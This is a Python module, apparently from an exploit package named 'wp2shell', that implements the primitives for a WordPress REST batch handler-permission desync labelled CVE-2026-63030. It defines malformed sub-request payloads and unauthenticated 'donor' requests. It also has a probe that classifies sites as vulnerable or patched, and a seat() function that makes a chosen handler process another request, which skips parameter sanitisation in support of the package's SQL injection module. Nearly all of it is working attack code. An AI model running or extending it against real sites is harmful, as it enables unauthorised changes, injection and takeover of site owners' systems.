"""CVE-2026-63030 — REST batch handler-permission desync primitives.

A malformed sub-request path (``http://:``) is recorded in the dispatcher's
``$validation`` array but not ``$matches``, desynchronising the two. With ``k``
leading malformed sub-requests, the request at position ``i`` is executed by the
handler matched to position ``i + k`` — an attacker-steered "wrong handler runs
this request", where that handler's own ``sanitize_params``/``has_valid_params``
never run (the input-validation-bypass this package's SQLi module relies on).
"""

import json

from .http import endpoints, send_batch

# Sub-request whose path fails wp_parse_url(), triggering the array desync.
MALFORMED = {"method": "POST", "path": "http://:"}

# Donors that pass their own batch validation unauthenticated (no permission
# check happens during validation), so a drifted handler will execute.
DONOR_DELETE_POST = {"method": "DELETE", "path": "/wp/v2/posts/0"}
DONOR_POST_CATEGORY = {"method": "POST", "path": "/wp/v2/categories",
                       "body": {"name": "wp2shell-donor"}}

# Non-destructive detector probe: a categories DELETE judged by the
# block-renderer's gate (drift +1) is the vulnerability tell.
_CATEGORIES = {"method": "DELETE", "path": "/wp/v2/categories/0"}
_BLOCK = {"method": "POST", "path": "/wp/v2/block-renderer/core/paragraph"}
VULN_SIGNAL = "block_cannot_read"       # categories request judged by block-renderer
PATCHED_SIGNALS = ("rest_term_invalid",)  # categories request judged by its own handler


def parse_responses(raw):
    try:
        d = json.loads(raw.decode(errors="replace"))
    except Exception:  # noqa: BLE001
        return None
    return d.get("responses") if isinstance(d, dict) else None


def body_code(resp):
    """Extract the WP error/response ``code`` from one batch sub-response."""
    if isinstance(resp, dict):
        b = resp.get("body")
        if isinstance(b, dict):
            return b.get("code", "OK")
    return None


def subcodes(raw):
    resps = parse_responses(raw)
    if not resps:
        return None
    return [body_code(r) if isinstance(r, dict) else None for r in resps] or None


def working_endpoint(base):
    """Return the first batch endpoint spelling that answers, or ``None``."""
    probe = [MALFORMED, DONOR_DELETE_POST, _BLOCK]
    for url in endpoints(base):
        code, raw = send_batch(url, probe)
        if code is not None and parse_responses(raw) is not None:
            return url
    return None


def detect(url):
    """Non-destructive classification. Returns ``(verdict, codes)`` where verdict
    is ``VULNERABLE`` / ``PATCHED`` / ``INCONCLUSIVE``. Sends only unauthenticated
    requests against non-existent term ids — nothing is created or changed."""
    _, raw = send_batch(url, [MALFORMED, _CATEGORIES, _BLOCK])
    codes = subcodes(raw)
    if not codes or len(codes) < 2:
        return "INCONCLUSIVE", codes
    sig = codes[1]
    if sig == VULN_SIGNAL:
        return "VULNERABLE", codes
    if sig in PATCHED_SIGNALS:
        return "PATCHED", codes
    return "INCONCLUSIVE", codes


def seat(url, target, donor, k=1, cookies=None, nonce=None, extra_tail=None):
    """Execute ``target``'s handler against ``donor``'s request object via the
    desync. Layout: ``[MALFORMED*k, donor, target, *extra_tail]``. Returns
    ``(status, responses, donor_response)`` — donor_response is what the drifted
    handler produced when fed the donor request."""
    layout = [MALFORMED] * k + [donor, target] + (extra_tail or [])
    code, raw = send_batch(url, layout, cookies=cookies, nonce=nonce)
    responses = parse_responses(raw)
    donor_resp = responses[k] if responses and len(responses) > k else None
    return code, responses, donor_resp


def desync_present(url):
    """True if the block-renderer gate adjudicates a posts DELETE (63030 active)."""
    donor_resp = seat(url, target=_BLOCK, donor=DONOR_DELETE_POST, k=1)[2]
    return body_code(donor_resp) == VULN_SIGNAL
